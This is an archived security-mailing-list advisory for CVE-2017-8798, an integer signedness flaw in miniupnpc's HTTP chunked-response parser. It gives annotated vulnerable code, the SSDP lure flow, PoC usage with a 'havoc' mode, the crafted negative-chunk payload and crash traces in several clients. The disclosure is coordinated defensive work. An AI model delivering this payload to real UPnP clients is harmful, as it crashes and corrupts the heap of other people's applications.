X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["24440" "Thursday" "11" "May" "2017" "23:38:31" "+0200" "oststrom \\(public\\)" "pub@oststrom.com" "<000d01d2ca9e$f01817c0$d0484740$@oststrom.com>" "642" "[oss-security] CVE-2017-8798 - miniupnpc integer signedness error when parsing a chunked encoded http response" nil nil nil "5" "2017051121:38:31" "[oss-security] CVE-2017-8798 - miniupnpc integer signedness error when parsing a chunked encoded http response" (number mark "U       pub@oststrom May 11  642/24440 " thread-indent "\"[oss-security] CVE-2017-8798 - miniupnpc integer signedness error when parsing a chunked encoded http response\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 22122 invoked by uid 550); 11 May 2017 21:39:44 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 21540 invoked from network); 11 May 2017 21:38:42 -0000
From: "oststrom \(public\)" <pub@oststrom.com>
To: <fulldisclosure@seclists.org>,
	<oss-security@lists.openwall.com>
Date: Thu, 11 May 2017 23:38:31 +0200
Message-ID: <000d01d2ca9e$f01817c0$d0484740$@oststrom.com>
MIME-Version: 1.0
Content-Type: text/plain;
	charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Mailer: Microsoft Outlook 14.0
Thread-Index: AdLKns2CljMFDxRWSLaS+RRJVWAaxw==
Content-Language: en-us
Subject: [oss-security] CVE-2017-8798 - miniupnpc integer signedness error when parsing a chunked encoded http response


Author:     <github.com/tintinweb>
Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798
Version:    0.6
Date:       May 1st, 2017

Tag:        miniupnp miniupnpc getHTTPResponse chunked encoding integer sig=
nedness error

Overview
--------

Name:           miniupnpc
Vendor:         Thomas Bernard
References:     * http://miniupnp.free.fr/ [1]

Version:        v2.0 [2]
Latest Version: v2.0.20170421 [2][3]
Other Versions: >=3D v1.4.20101221 [2] (released 21/12/2010; ~6 years ago)
Platform(s):    cross
Technology:     c

Vuln Classes:   CWE-196, CWE-190
Origin:         remote
Min. Privs.:    ---

CVE:            CVE-2017-8798


Description
---------

quote website [1]

>UPnP IGD client lightweight library and UPnP IGD daemon
>The UPnP protocol is supported by most home adsl/cable routers and
 Microsoft Windows 2K/XP. The aim of the MiniUPnP project is to bring a
 free software solution to support the "Internet Gateway Device" part of
 the protocol. The MediaServer/MediaRenderer UPnP protocol (DLNA) is also
 becoming very popular but here we are talking about IGD. ReadyMedia
 (formely known as MiniDLNA) is a UPnP Media Server using some UPnP code
 from MiniUPnPd.

miniupnp is part of many applications / embedded network devices

* P2P File Sharing software
* Network Device Firmware
* Blockchain clients
* ...


Summary
-------

*TL;DR - one-click crash miniupnpc based applications on your network*

#### Integer signedness error in miniupnpc allows remote attackers to
cause a denial of service condition via specially crafted HTTP response

An integer signedness error was found in miniupnp's `miniwget` allowing
an unauthenticated remote entity typically located on the
local network segment to trigger a heap corruption or an access violation
in miniupnp's http response parser when processing a specially crafted
chunked-encoded response to a request for the xml root description url.

To exploit this vulnerability, an attacker only has to provide a
chunked-encode HTTP response with a negative chunk length to upnp=20
clients requesting a resource on the attackers webserver. Upnp clients=20
can easily be instructed to request resources on the attackers webserver
by answering SSDP discovery request or by issueing SSDP service=20
notifications (low complexity, integral part of the protocol).=20


* remote, unauthenticated, `ACCESS_VIOLATION_READ` and heap corruption
* (confirmed) DoS; (unconfirmed) other impacts


see attached PoC
see proposed patch

Details
-------

The vulnerable component is a HTTP file download method called=20
`miniwget` (precisely `getHTTPResponse`) that fails to properly handle
invalid chunked-encoded HTTP responses. The root cause is a bounds check
that mistakenly casts an unsigned attacker-provided chunksize to signed
int leading to an incorrect decision on the destination heap buffer size
when copying data from the server response to an internal buffer. The
attacker controls both the size of the internal buffer as well as the
number of bytes to copy. In order for this attack to succeed, the number
of bytes to copy must be negative.

attacker controls:
* `int content_length`
* `unsigned int chunksize`
* `bytestocopy` if `(int) chunksize` is negative (or at least < `n-i` ~ 190=
0 bytes)
* length of `content_buf` if `bytestocopy` is negative

In the end, the attacker controls
* `realloc(content_buf, content_length)`
* `memcpy(content_buf+x, http_response, chunksize)`


client (miniupnpc)                         server (poc.py)
    |                                         |
    |                                         |
    | SSDP:  Discovery - M-SEARCH             |
1.  | --------------------------------------> |
    |                                         |
    | SSDP:  Reply - Location Header          |
2.  | <-------------------------------------- |
    |                                         |
    |        GET (Location Header/xxxx.xml)   |
3.  | --------------------------------------> |
    |                                         |
    |        HTTP chunked-encoded reply       |
4.  | <-------------------------------------- |
    |                                         |

1. application performs SSDP discovery via M-SEARCH (multicast, local netwo=
rk
   segment)
2. poc.py responds with the url to the xml root description requesting the
   application to navigate to the malicious webserver.
3. application requests xml root description url (taken from reply to M-SEA=
RCH,
   Location Header) on malicious webserver (poc.py)
4. poc.py responds with a specially crafted http response triggering the he=
ap
   overwrite in miniupnp

#### Source

*Note:* Inline annotations are prefixed with //#!
*Note:* This is a stripped down version of the vulnerable code. For full de=
tails
        see https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798

`miniwget.c:236` [4]

* A) 1. to 3. is the parsing of the chunksize
* B) 4. to 5. integer signedness error
* C) 6. integer wrapping
* D) 7. to 9. destination buffer size
* E) 10. heap overwrite with size in bytestocopy

...
//#! 4)
//#!   goal: a) bytestocopy becomes negative due to chunksize being negative
//#!         b) content_length defines destination buffer size
//#!         c) overwrite destination heap buffer content_buf[content_lengt=
h] with bytestocopy bytes from request
//#!            memcopy(content_buf[content_length], req_body, (unsigned)by=
testocopy)
//#!
bytestocopy =3D ((int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);=
   //#! 5) boom! - bytestocopy becomes chunksize since chunksize is negativ=
e (e.g. -1)
if((content_buf_used + bytestocopy) > content_buf_len)                     =
 //#! 6) true, since bytestocopy is negative, wraps unsigned content_buf_us=
ed
{
    char * tmp;
    if(content_length >=3D (int)(content_buf_used + bytestocopy)) {        =
   //#! 7) content_length is attacker controlled.
        content_buf_len =3D content_length;                                =
   //#! 8) we want content_length to define our dst buffer size (e.g. 1)
    } else {                                                               =
  //#!   if we dont hit this, content_buf_len would likely be ~2k
        content_buf_len =3D content_buf_used + bytestocopy;
    }
    tmp =3D realloc(content_buf, content_buf_len);                         =
   //#! 9) realloc to content_length bytes (e.g. 9000)
    if(tmp =3D=3D NULL) {
        /* memory allocation error */
        free(content_buf);
        free(header_buf);
        *size =3D -1;
        return NULL;
    }
    content_buf =3D tmp;
}
memcpy(content_buf + content_buf_used, buf + i, bytestocopy);              =
 //#! 10) boom heap overwrite with bytesttocopy bytes (e.g. (unsigned)-1) t=
o content_length (e.g. 9000) sized buffer
content_buf_used +=3D bytestocopy;                                         =
   //#!     (also an out of bounds ready since it has not been checked if b=
uf holds enough bytes)
i +=3D bytestocopy;
chunksize -=3D bytestocopy;


#### Taint Graph

basically all `miniwget*` and `UPNP_*` methods.

* getHTTPResponse (vulnerable)
 * miniwget3
  * miniwget2
   * miniwget
   * miniwget_getaddr
    * UPNP_GetIGDFromUrl
    * UPNP_GetValidIGD
     * UPnP_selectigd
 * UPNP_Get*
 * UPNP_Check*
 * UPNP_Delete*
 * UPNP_Update*
 * UPNP_Add*


#### Scenarios

The PoC can be configured for three scenarios:

##### 1) SCENARIO_CRASH_LARGE_MEMCPY

Similar to 3) attempts to smash the heap but likely fails with an
`ACCESS_VIOLATION_READ` when trying to read from an non-accessible
memory region.

details see [7]

##### 2) SCENARIO_CRASH_REALLOC_NULLPTR

Miniupnp v1.8 was missing an error check for `realloc` which can
be used to cause a DoS condition when making `realloc` fail while
allocating a large chunk of data. When `realloc` fails - because
the requested size of memory cannot be allocated - it returns a
`nullptr`. Miniupnp ~1.8 was missing a check for the `nullptr`
and tried to `memcpy` bytes from the attackers http response to
that `nullptr` which fails with an `ACCESS_VIOLATION`.

To provoke this scenario one must provide an arbitrarily large
`content_length` (e.g. `0x7fffffff` likely fails on 32 bits) and
make `memcpy` attempt to copy a byte to that location.


##### 3) SCENARIO_CRASH_1_BYTE_BUFFER

The idea is to create a small heap buffer and overwrite it with
a large chunk of data. This can be achieved by instructing
miniupnp to `realloc` `content_buf` to a size of `1 byte` by
providing a `content-length` of `1`. To overwrite this 1 byte
buffer the attacker provides a negative chunksize e.g.
`0x80000000`. Depending on the implementation of `memcpy` and
the memory layout `memcpy` will either fail with a
`ACCESS_VIOLATION_READ` as we're only providing <=3D 2048 bytes
with the server response and will most certainly hit a non-accessible
memory region while copying `0x80000000` bytes or the application
crashes because of a heap corruption.

Here's an example of `miniupnpc` corrupting the heap when compiled
for 32 bit platforms.


=C3=A2=C2=BA 0x80504de <getHTTPResponse+1912>    call   memcpy@plt         =
           <0x8048a20>
    dest: 0x805981f =C3=A2=C3=A2 0x0                    //#! <--- size 1 - =
attacker controlled content_buf
    src: 0xffffb77e =C3=A2=C3=A2 0x41414141 ('AAAA')    //#! <--- attacker =
controlled http response
    n: 0x80000000                             //#! <--- attacker controlled=
 (must be negative) bytestocopy

pwndbg> i lo
i =3D 30
buf =3D "f\r\n<xml>BOOM</x"...
n =3D <optimized out>
endofheaders =3D 91
chunked =3D 1
content_length =3D 1
chunksize =3D 2147483648
bytestocopy =3D 2147483648                          //#! <--- nr of bytes t=
o copy from buf
header_buf =3D 0x8059008 "HTTP/1.1 200 OK"...
header_buf_len =3D 2048
header_buf_used =3D <optimized out>
content_buf =3D 0x8059810 "<xml>BOOM</x\351\a\002"
content_buf_len =3D 1                               //#! <--- destination, =
realloc'd to 1
content_buf_used =3D 15
chunksize_buf =3D "\000\060\060\060\060\060\060\060\000\267\377\377p12"...
chunksize_buf_index =3D <optimized out>
reason_phrase =3D 0x0
reason_phrase_len =3D 0

//#! ### before memcpy
pwndbg> hexdump content_buf 100
+0000 0x8059810  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 00  =C3=A2=
<xml=C3=A2>BOO=C3=A2M</x=C3=A2....=C3=A2
+0010 0x8059820  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  =C3=A2=
....=C3=A2....=C3=A2....=C3=A2....=C3=A2
...
+0060 0x8059870  00 00 00 00                                         =C3=A2=
....=C3=A2    =C3=A2    =C3=A2    =C3=A2
+0064 0x8059874

//#! ### after memcpy
pwndbg> hexdump content_buf 100
+0000 0x8059810  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 41  =C3=A2=
<xml=C3=A2>BOO=C3=A2M</x=C3=A2...A=C3=A2
+0010 0x8059820  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  =C3=A2=
AAAA=C3=A2AAAA=C3=A2AAAA=C3=A2AAAA=C3=A2
...
+0060 0x8059870  41 41 41 41                                         =C3=A2=
AAAA=C3=A2    =C3=A2    =C3=A2    =C3=A2
+0064 0x8059874


Proof of Concept
----------------

Prerequisites:

* any software that compiles with `miniupnpc`, calls `miniwget.c::miniwget(=
)`
  or any of the `UPNP_` methods - e.g. bitcoind (with -upnp), qBittorrent
  on startup
* `poc.py`, python 2.7, tested on windows and linux=20
(disable firewall or allow inbound tcp:65000, udp:1900)

Usage:

usage: poc.py [options]

           example: poc.py --listen <your_local_ip>:65000 [--havoc | --targ=
et <ip> [<ip>..]]



optional arguments:
  -h, --help            show this help message and exit
  -q, --quiet           be quiet [default: False]
  -l LISTEN, --listen LISTEN
                        local httpserver listen ip:port. Note: 0.0.0.0:<por=
t>
                        is not allowed. This ip is being used in the SSDP
                        response Location header.
  -u USN, --usn USN     Unique Service Name.
  -t [TARGET [TARGET ...]], --target [TARGET [TARGET ...]]
                        Specify a list of client-ips to attack. Use --havoc=
 to
                        attempt to crash all clients.
  -z, --havoc           Attempt to attack all clients connecting to our http
                        server. Use at your own risk.

run PoC

* local listen ip:port for the malicious web server: 192.168.2.104:65000 (y=
our_local_ip)
* only attempt to crash client 192.168.2.113 (use --havoc instead of --targ=
et to disable whitelist)

#> poc.py --listen <your_local_ip>:65000 --target 192.168.2.113

[poc.py -                 main() ][    INFO]


   _  _    _____ _____ _____ _____
  / |/ |  |  |  |  _  |   | |  _  |            ___ ___    _____ ___ ___ ___
 / // /   |  |  |   __| | | |   __|   _ _ _   |   | . |  |     | . |  _| -_|
|_/|_/    |_____|__|  |_|___|__|     |_|_|_|  |_|_|___|  |_|_|_|___|_| |___

                                                      //github.com/tintinweb


    [mode  ]     =E2=97=8E  filter (targeting ['192.168.2.113'])
    [listen]     =F0=9F=94=97 192.168.2.104:65000 (local http server listen=
ing ip)
    [usn   ]     =E2=9B=B9 uuid:deadface-dead-dead-dead-cafebabed00d::upnp:=
rootdevice

[poc.py -                 main() ][   DEBUG] spawning webserver: <BadHttpSe=
rver bind=3D('192.168.2.104', 65000)>
[poc.py -             __init__() ][   DEBUG] [SSDP] bind: 0.0.0.0:1900
[poc.py -               listen() ][    INFO] [HTTP] bind 192.168.2.104:65000
[poc.py -             __init__() ][   DEBUG] [SSDP] add membership: UDP/239=
.255.255.250
[poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'M-SEA=
RCH' : <function handle_msearch at 0x027B9270>
[poc.py -               listen() ][    INFO] [HTTP] waiting for connection
[poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'NOTIF=
Y' : <function handle_notify at 0x027B9330>
[poc.py -               listen() ][   DEBUG] [SSDP] listening...
[poc.py -               listen() ][    INFO] [      ] connection from: ('19=
2.168.2.113', 43810)
[poc.py -               listen() ][   DEBUG] GET /xxxx.xml HTTP/1.1
Host: 192.168.2.104:65000
Connection: Close
User-Agent: CentOS/7.2.1511, UPnP/1.1, MiniUPnPc/2.0


[poc.py -                 send() ][   DEBUG] HTTP/1.1 200 OK
Transfer-Encoding: chunked
Content-Length: 9041
Content-Type: text/html

f
<xml>BOOM</xml>
80000000
AAAAAAAAAAAAAAAA...         //#! Repeated 9k times.
3
bye
0
[poc.py -                 send() ][ WARNING] [----->] BOOM! payload deliver=
ed! - [to:('192.168.2.113', 43810)] <HttpLikeMessage msg=3D('HTTP/1.1', '20=
0', 'OK') header=3D{'Transfer-Encoding': 'chunked', 'Content-Length': 9041,=
 'Content-Type': 'text/html'} body=3D'f\r\n<xml>BOOM</xml>\r\n80000000\r\AA=
AA...<omitted>...AAAA\r\n3\r\nbye\r\n0'>
[poc.py -               listen() ][    INFO] waiting for connection


#### A) miniupnpc v2.0

[tin@localhost miniupnpc]$ gdb --args ./upnpc-static  -u http://192.168.2.1=
04:65000/xxxx.xml -d -s
...
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/tin/miniupnp/miniupnpc/./upnpc-static -u http://192=
.168.2.104:65000/xxxx.xml -d -s
upnpc : miniupnpc library test client, version 2.0.
 (c) 2005-2016 Thomas Bernard.
Go to http://miniupnp.free.fr/ or http://miniupnp.tuxfamily.org/
for more information.
parsed url : hostname=3D'192.168.2.104' port=3D65000 path=3D'/xxxx.xml' sco=
pe_id=3D0
address miniwget : 192.168.2.113
header=3D'Transfer-Encoding', value=3D'chunked'
chunked transfer-encoding!
header=3D'Content-Length', value=3D'9041'                //#!  user provide=
d content length (valid)
Content-Length: 9041
header=3D'Content-Type', value=3D'text/html'
chunksize =3D 15 (f)
chunksize =3D 2147483648 (80000000)                    //#!  user provided =
chunk size 0x80000000

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7b631a6 in __memcpy_ssse3_back () from /lib64/libc.so.6
(gdb) up
#1  0x000000000040897f in getHTTPResponse (s=3Ds@entry=3D7, size=3Dsize@ent=
ry=3D0x7fffffffd59c, status_code=3Dstatus_code@entry=3D0x0) at miniwget.c:3=
06
306          memcpy(content_buf + content_buf_used, buf + i, bytestocopy);
(gdb) bt
#0  0x00007ffff7b631a6 in __memcpy_ssse3_back () from /lib64/libc.so.6
#1  0x000000000040897f in getHTTPResponse (s=3Ds@entry=3D7, size=3Dsize@ent=
ry=3D0x7fffffffd59c, status_code=3Dstatus_code@entry=3D0x0) at miniwget.c:3=
06
#2  0x0000000000408d5c in miniwget3 (host=3Dhost@entry=3D0x7fffffffd500 "19=
2.168.2.104", port=3D<optimized out>, path=3D0x7fffffffe73c "/xxxx.xml", si=
ze=3Dsize@entry=3D0x7fffffffd59c,
    addr_str=3Daddr_str@entry=3D0x7fffffffe320 "192.168.2.113", addr_str_le=
n=3Daddr_str_len@entry=3D64, httpversion=3Dhttpversion@entry=3D0x40b665 "1.=
1", scope_id=3D0, status_code=3Dstatus_code@entry=3D0x0)
    at miniwget.c:468
#3  0x00000000004091f1 in miniwget2 (status_code=3D0x0, scope_id=3D<optimiz=
ed out>, addr_str_len=3D64, addr_str=3D0x7fffffffe320 "192.168.2.113", size=
=3D0x7fffffffd59c, path=3D<optimized out>, port=3D<optimized out>,
    host=3D0x7fffffffd500 "192.168.2.104") at miniwget.c:484
#4  miniwget_getaddr (url=3Durl@entry=3D0x7fffffffe722 "http://192.168.2.10=
4:65000/xxxx.xml", size=3Dsize@entry=3D0x7fffffffd59c, addr=3Daddr@entry=3D=
0x7fffffffe320 "192.168.2.113", addrlen=3Daddrlen@entry=3D64,
    scope_id=3Dscope_id@entry=3D0, status_code=3Dstatus_code@entry=3D0x0) a=
t miniwget.c:659
#5  0x00000000004043f1 in UPNP_GetIGDFromUrl (rootdescurl=3Drootdescurl@ent=
ry=3D0x7fffffffe722 "http://192.168.2.104:65000/xxxx.xml", urls=3Durls@entr=
y=3D0x7fffffffd6a0, data=3Ddata@entry=3D0x7fffffffd790,
    lanaddr=3Dlanaddr@entry=3D0x7fffffffe320 "192.168.2.113", lanaddrlen=3D=
lanaddrlen@entry=3D64) at miniupnpc.c:708
#6  0x0000000000401f69 in main (argc=3D<optimized out>, argv=3D0x7fffffffe4=
78) at upnpc.c:690
(gdb) i lo
i =3D 30
buf =3D "f\r\n<xml>BOOM</xml>\r\n80000000\r\n", 'A' <repeats 1418 times>...
n =3D 1354
endofheaders =3D 94
chunked =3D 1                      //#!  chunked-encoding mode
content_length =3D 9041            //#!  user provided content-length (vali=
d)
chunksize =3D 2147483648           //#!  user provided chunk-size (invalid,=
 0x80000000)
bytestocopy =3D 2147483648         //#!  is our chunk-size. used in call to=
 memcpy as the number of bytes to copy.
header_buf =3D 0x610010 "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nC=
ontent-Length: 9041\r\nContent-Type: text/html\r\n\r\nf\r\n<xml>BOOM</xml>\=
r\n80000000\r\n", 'A' <repeats 76 times>...
header_buf_len =3D 2048
header_buf_used =3D 1448
content_buf =3D 0x610820 "<xml>BOOM</xml>"
content_buf_len =3D 9041           //#!  has been reallocated to content-le=
ngth (otherwise this would be ~2k)
content_buf_used =3D 15
chunksize_buf =3D "\000\060\060\060\060\060\060\060\000\311\377\377\377\177=
\000\000\313\305@\000\000\000\000\000\005\000\000\000\000\000\000"
chunksize_buf_index =3D 0
reason_phrase =3D 0x0
reason_phrase_len =3D 0


#### B) cpp-ethereum v1.3.0

[tin@localhost miniupnpc]$ gdb --args eth -v 9
...
(gdb) r
Starting program: /usr/bin/eth -v 9
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
cpp-ethereum, a C++ Ethereum client
...  05:57:56 PM.351|eth  Reading /home/...
=C3=A2=C2=A7 =C3=A2
    =C2=B9  05:57:56 PM.358|eth  Id: ##013a7f1f=C3=A2=C2=A6
[New Thread 0x7fffe6191700 (LWP 9306)]
...  05:57:56 PM.371|eth  Opened blockchain DB. Latest: #5203fef2=C3=A2=C2=
=A6 (rebuild not needed)
[New Thread 0x7fffe5990700 (LWP 9307)]
...  05:57:56 PM.374|eth  Opened state DB.
[New Thread 0x7fffe4e2a700 (LWP 9308)]
=C3=A2=C2=A7=C2=AB =C3=A2  05:57:56 PM.375|eth  startedWorking()
cpp-ethereum 1.3.0
  By cpp-ethereum contributors, (c) 2013-2016.
  See the README for contributors and credits.
Transaction Signer: XE50000000000000000000000000000000 (00000000-0000-0000-=
0000-000000000000 - 00000000)
Mining Beneficiary: XE50000000000000000000000000000000 (00000000-0000-0000-=
0000-000000000000 - 00000000)
Foundation: XX55PXQKKKXB9BYPBXT1XCYW6R5ELFAT6EM (00000000-0000-0000-0000-00=
0000000000 - de0b2956)
[New Thread 0x7fffd7fff700 (LWP 9309)]
[New Thread 0x7fffd77fe700 (LWP 9310)]
  =C3=A2
   =C2=B9  05:58:00 PM.757|p2p  UPnP device: http://192.168.2.104:65000/xxx=
x.xml [st: urn:schemas-upnp-org:device:InternetGatewayDevice:1 ]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7fffd7fff700 (LWP 9309)]
0x00007ffff3feb0a9 in __memcpy_ssse3_back () from /lib64/libc.so.6
(gdb)
#0  0x00007ffff3feb0a9 in __memcpy_ssse3_back () from /lib64/libc.so.6
#1  0x00007ffff4a8bfce in getHTTPResponse () from /lib64/libminiupnpc.so.16
#2  0x00007ffff4a8c43f in miniwget3.constprop.0 () from /lib64/libminiupnpc=
.so.16
#3  0x00007ffff4a8c873 in miniwget () from /lib64/libminiupnpc.so.16
#4  0x00007ffff62cb97f in dev::p2p::UPnP::UPnP() () from /lib64/libp2p.so
#5  0x00007ffff633d2d0 in dev::p2p::Network::traverseNAT(std::set<boost::as=
io::ip::address, std::less<boost::asio::ip::address>, std::allocator<boost:=
:asio::ip::address> > const&, unsigned short, boost::asio::ip::address&) ()=
 from /lib64/libp2p.so
#6  0x00007ffff62eed05 in dev::p2p::Host::determinePublic() () from /lib64/=
libp2p.so
#7  0x00007ffff62ef3b3 in dev::p2p::Host::startedWorking() () from /lib64/l=
ibp2p.so
#8  0x00007ffff610e979 in dev::Worker::startWorking()::{lambda()#1}::operat=
or()() const () from /lib64/libdevcore.so
#9  0x00007ffff4831220 in ?? () from /lib64/libstdc++.so.6
#10 0x00007ffff72cddc5 in start_thread () from /lib64/libpthread.so.0
#11 0x00007ffff3f97ced in clone () from /lib64/libc.so.6


#### D) bitcoind 0.14.1 (linux)

#> src\bitcoind -upnp -printtoconsole

pwndbg> bt
#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-u=
naligned.S:36
#1  0x00007ffff6abe91e in getHTTPResponse () from /usr/lib/x86_64-linux-gnu=
/libminiupnpc.so.10
#2  0x00007ffff6abed22 in ?? () from /usr/lib/x86_64-linux-gnu/libminiupnpc=
.so.10
#3  0x00007ffff6abf12d in miniwget_getaddr () from /usr/lib/x86_64-linux-gn=
u/libminiupnpc.so.10
#4  0x00007ffff6ac0f9e in UPNP_GetValidIGD () from /usr/lib/x86_64-linux-gn=
u/libminiupnpc.so.10
#5  0x000055555560ee0b in ThreadMapPort () at net.cpp:1446
#6  0x0000555555622e44 in TraceThread<void (*)()> (name=3D0x555555a81767 "u=
pnp", func=3D0x55555560ed3a <ThreadMapPort()>) at util.h:218
#7  0x0000555555689c4e in boost::_bi::list2<boost::_bi::value<char const*>,=
 boost::_bi::value<void (*)()> >::operator()<void (*)(char const*, void (*)=
()), boost::_bi::list0> (this=3D0x5555561544c0, f=3D@0x5555561544b8: 0x5555=
55622dc2 <TraceThread<void (*)()>(char const*, void (*)())>, a=3D...) at /u=
sr/include/boost/bind/bind.hpp:313
#8  0x000055555568996a in boost::_bi::bind_t<void, void (*)(char const*, vo=
id (*)()), boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::va=
lue<void (*)()> > >::operator() (this=3D0x5555561544b8) at /usr/include/boo=
st/bind/bind_template.hpp:20
#9  0x00005555556896eb in boost::detail::thread_data<boost::_bi::bind_t<voi=
d, void (*)(char const*, void (*)()), boost::_bi::list2<boost::_bi::value<c=
har const*>, boost::_bi::value<void (*)()> > > >::run (this=3D0x55555615430=
0) at /usr/include/boost/thread/detail/thread.hpp:117
#10 0x00007ffff753aaea in ?? () from /usr/lib/x86_64-linux-gnu/libboost_thr=
ead.so.1.55.0
#11 0x00007ffff5c3a064 in start_thread (arg=3D0x7fffd97fa700) at pthread_cr=
eate.c:309
#12 0x00007ffff596f62d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clo=
ne.S:111


Mitigation / Workaround / Discussion
-------------------------------------

* update to miniupnpc-2.0.20170509.tar.gz
* disable upnp

*Note*: patch see [7]


Notes
-----

* Vendor acknowledgement / Miniupnp Changelog [5]
* Thanks to the miniupnp project for providing a fixed version within ~1 we=
ek!
* This research/disclosure was coordinated in cooperation with the ethereum=
 foundation at ethereum.org. Thanks, it was a pleasure working with you!


References
----------

[1] http://miniupnp.free.fr/
[2] http://miniupnp.free.fr/files/
[3] https://github.com/miniupnp/miniupnp/tree/master
[4] https://github.com/miniupnp/miniupnp/blob/master/miniupnpc/miniwget.c#L=
236
[5] http://miniupnp.free.fr/files/changelog.php?file=3Dminiupnpc-2.0.201705=
09.tar.gz
[6] https://github.com/miniupnp/miniupnp/commit/f0f1f4b22d6a98536377a1bb07e=
7c20e4703d229
[7] https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798


Contact
-------

https://github.com/tintinweb

